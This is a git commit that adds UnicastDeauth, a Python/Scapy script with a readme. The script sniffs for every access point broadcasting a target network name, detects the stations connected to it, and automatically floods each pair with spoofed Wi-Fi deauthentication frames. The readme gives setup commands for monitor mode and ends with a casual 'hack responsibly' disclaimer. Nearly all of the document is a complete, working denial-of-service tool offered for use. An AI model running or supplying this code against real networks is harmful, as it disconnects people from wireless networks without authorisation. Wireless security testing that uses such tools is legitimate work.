bc26951a605db1ed348f18a0479e999ce39a250d
mamatb <mamatb@github>
2023-08-14 12:27:23 +0200

    UnicastDeauth initial version

---
+++ UnicastDeauth.py
@@ -0,0 +1,168 @@
+#!/usr/bin/env python3
+
+# UnicastDeauth is a simple Python 3 script that automates unicast Wi-Fi deauthentication attacks
+# author - mamatb (t.me/m_amatb)
+# location - https://github.com/mamatb/UnicastDeauth
+# style guide - https://google.github.io/styleguide/pyguide.html
+
+# TODO
+#
+#   add ap whitelist argument
+#   add module docstring
+#   add support for hidden networks
+
+import sys
+import argparse
+from scapy import sendrecv
+from scapy.layers import dot11
+
+BPF_DOT11_BEACON = 'wlan type mgt subtype beacon'
+BPF_DOT11_CONTROL =  'wlan type ctl'
+BPF_DOT11_DATA = 'wlan type data'
+DEAUTH_COUNT = 64
+DEAUTH_INTER = 2./DEAUTH_COUNT
+
+class MsgException(Exception):
+    def __init__(self, exception, message = 'Unknown error', *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self.exception = exception
+        self.message = message
+    
+    def __str__(self):
+        return f'[!] Error! {self.message}:\n    {self.exception}'
+
+def panic(msg_exception):
+    '''exception handling'''
+    
+    print(msg_exception, file = sys.stderr)
+
+def print_info(message):
+    '''additional info printing'''
+    
+    print(f'[!] Info: {message}', file = sys.stdout)
+
+def is_unicast(bssid):
+    '''bssid type checking'''
+    
+    try:
+        unicast = not (int(bssid.split(':')[0], 16) & 0x1)
+    except Exception as e:
+        raise MsgException(e, 'BSSID could not be processed')
+    return unicast
+
+def get_src_dst_network(packet):
+    '''frame control field parsing'''
+    
+    try:
+        if packet.FCfield & 0x1:
+            if not (packet.FCfield & 0x2):
+                bssid_src = packet.addr2
+                bssid_dst = packet.addr3
+                bssid_network = packet.addr1
+        else:
+            bssid_dst = packet.addr1
+            if packet.FCfield & 0x2:
+                bssid_src = packet.addr3
+                bssid_network = packet.addr2
+            else:
+                bssid_src = packet.addr2
+                bssid_network = packet.addr3
+    except Exception as e:
+        raise MsgException(e, 'Frame Control field could not be processed')
+    return bssid_src, bssid_dst, bssid_network
+
+def unicast_deauth(wifi_interface, bssid_sta, bssid_ap, bssid_network):
+    '''unicast deauthentication'''
+    
+    try:
+        print_info(f'sending {DEAUTH_COUNT} deauthentication frames from AP {bssid_ap} to STA {bssid_sta} ...')
+        sendrecv.sendp(
+            dot11.RadioTap() / dot11.Dot11(addr1 = bssid_sta, addr2 = bssid_ap, addr3 = bssid_network) / dot11.Dot11Deauth(reason = 7),
+            iface = wifi_interface,
+            count = DEAUTH_COUNT,
+            inter = DEAUTH_INTER,
+            verbose = False,
+        )
+        print_info(f'sending {DEAUTH_COUNT} deauthentication frames from STA {bssid_sta} to AP {bssid_ap} ...')
+        sendrecv.sendp(
+            dot11.RadioTap() / dot11.Dot11(addr1 = bssid_ap, addr2 = bssid_sta, addr3 = bssid_network) / dot11.Dot11Deauth(reason = 7),
+            iface = wifi_interface,
+            count = DEAUTH_COUNT,
+            inter = DEAUTH_INTER,
+            verbose = False,
+        )
+    except Exception as e:
+        raise MsgException(e, 'Deauthentication frames could not be sent')
+
+def sniffer_wrapper(wifi_interface, wifi_essid, bssids_aps_dict, bssids_stas_dict):
+    def sniffer_handler(packet):
+        '''sniffed packet processing'''
+        
+        try:
+            bssid_src, bssid_dst, bssid_network = get_src_dst_network(packet)
+            if bssid_src and bssid_dst and bssid_network:
+                
+                if packet.haslayer(dot11.Dot11Beacon): # wlan type mgt subtype beacon
+                    if not bssids_aps_dict.get(bssid_src):
+                        dot11_element = packet.getlayer(dot11.Dot11Elt)
+                        while dot11_element:
+                            if dot11_element.ID == 0:
+                                if dot11_element.info and (dot11_element.info == bytes(wifi_essid, 'utf-8')):
+                                    bssids_aps_dict.update({bssid_src: bssid_network})
+                                    print_info(f'AP detected for network {wifi_essid}'
+                                        f'\n    network      = {bssid_network}'
+                                        f'\n    access point = {bssid_src}')
+                                break
+                            dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
+                
+                else: # wlan type ctl or wlan type data
+                    if bssids_aps_dict.get(bssid_src) and is_unicast(bssid_dst): # from ap to sta
+                        if (not bssids_stas_dict.get(bssid_dst)) or (bssids_stas_dict.get(bssid_dst) != bssid_src):
+                            bssids_stas_dict.update({bssid_dst: bssid_src})
+                            print_info(f'STA detected for network {wifi_essid}'
+                                f'\n    station      = {bssid_dst}'
+                                f'\n    access point = {bssid_src}')
+                            unicast_deauth(wifi_interface, bssid_dst, bssid_src, bssid_network)
+                    elif bssids_aps_dict.get(bssid_dst): # from sta to ap
+                        if (not bssids_stas_dict.get(bssid_src)) or (bssids_stas_dict.get(bssid_src) != bssid_dst):
+                            bssids_stas_dict.update({bssid_src: bssid_dst})
+                            print_info(f'STA detected for network {wifi_essid}'
+                                f'\n    station      = {bssid_src}'
+                                f'\n    access point = {bssid_dst}')
+                            unicast_deauth(wifi_interface, bssid_src, bssid_dst, bssid_network)
+        except Exception as e:
+            raise MsgException(e, 'Sniffed packets could not be processed')
+    return sniffer_handler
+
+def main():
+    '''main'''
+    
+    try:
+        parser = argparse.ArgumentParser()
+        parser.add_argument(
+            '-i',
+            dest = 'wifi_interface',
+            help = 'Wi-Fi interface',
+            required = True,
+        )
+        parser.add_argument(
+            '-e',
+            dest = 'wifi_essid',
+            help = 'Wi-Fi ESSID',
+            required = True,
+        )
+        args = parser.parse_args()
+        bssids_aps_dict = {} # {ap bssid: network bssid}
+        bssids_stas_dict = {} # {sta bssid: ap bssid}
+        sendrecv.sniff(
+            iface = args.wifi_interface,
+            filter = BPF_DOT11_BEACON + ' or ' + BPF_DOT11_CONTROL + ' or ' + BPF_DOT11_DATA,
+            prn = sniffer_wrapper(args.wifi_interface, args.wifi_essid, bssids_aps_dict, bssids_stas_dict),
+        )
+    except MsgException as msg_exception:
+        panic(msg_exception)
+    except Exception as e:
+        panic(MsgException(e))
+
+if __name__ == '__main__':
+    main()
---
+++ readme.md
@@ -0,0 +1,56 @@
+# UnicastDeauth
+
+* [What?](#what)
+* [Why?](#why)
+* [Installation](#installation)
+* [Usage](#usage)
+* [Disclaimer](#disclaimer)
+* [Acknowledgements and references](#acknowledgements_and_references)
+
+## What? <a name="what" />
+
+UnicastDeauth is a simple Python 3 script that automates unicast Wi-Fi deauthentication attacks. In order to do so, it identifies all access points (APs) emitting the target ESSID and all connected stations (STAs), launching [Aircrack-ng's typical deauthentication](https://www.aircrack-ng.org/doku.php?id=deauthentication#typical_deauthentication) for each AP-STA tuple.
+
+## Why? <a name="why" />
+
+As [some STAs ignore broadcast deauthentication frames](https://www.aircrack-ng.org/doku.php?id=deauthentication#why_does_deauthentication_not_work), I've had to grab BSSIDs from `airodump-ng` to later specify them in `aireplay-ng` many times, so I thought of automating this process to save some time.
+
+## Installation <a name="installation" />
+
+```bash
+git clone 'https://github.com/mamatb/UnicastDeauth.git'
+pip install -r './UnicastDeauth/requirements.txt'
+```
+
+## Usage <a name="usage" />
+
+As with all tools using Wi-Fi cards in monitor mode, first kill all processes that could interfere and then configure the Wi-Fi interface (as root):
+```bash
+airmon-ng check kill
+ip link set dev <wifi_interface> down
+iw dev <wifi_interface> set monitor control
+iw dev <wifi_interface> set channel <wifi_channel>
+ip link set dev <wifi_interface> up
+
+```
+After that just follow the help section of the script:
+```
+usage: UnicastDeauth.py [-h] -i WIFI_INTERFACE -e WIFI_ESSID
+
+options:
+  -h, --help         show this help message and exit
+  -i WIFI_INTERFACE  Wi-Fi interface
+  -e WIFI_ESSID      Wi-Fi ESSID
+```
+
+## Disclaimer <a name="disclaimer" />
+
+Please note that launching deauthentication attacks can be pretty noisy in certain environments. So hack responsibly or something like that.
+
+## Acknowledgements and references <a name="acknowledgements_and_references" />
+
+* [rsrdesarrollo](https://github.com/rsrdesarrollo) for helping me understand the Frame Control field and some Scapy basics. He also runs a Wi-Fi hacking suite called [pinecone](https://github.com/pinecone-wifi/pinecone) that you should definitely check out if interested in Wi-Fi hacking.
+* [Aircrack-ng's deauthentication documentation](https://www.aircrack-ng.org/doku.php?id=deauthentication).
+* [Scapy's usage documentation](https://scapy.readthedocs.io/en/latest/usage.html).
+* [mrn-cciew's blogpost "CWAP – MAC Header : Addresses"](https://mrncciew.com/2014/09/28/cwap-mac-headeraddresses/).
+* [mrn-cciew's blogpost "802.11 Mgmt : Deauth & Disassociation Frames"](https://mrncciew.com/2014/10/11/802-11-mgmt-deauth-disassociation-frames/).
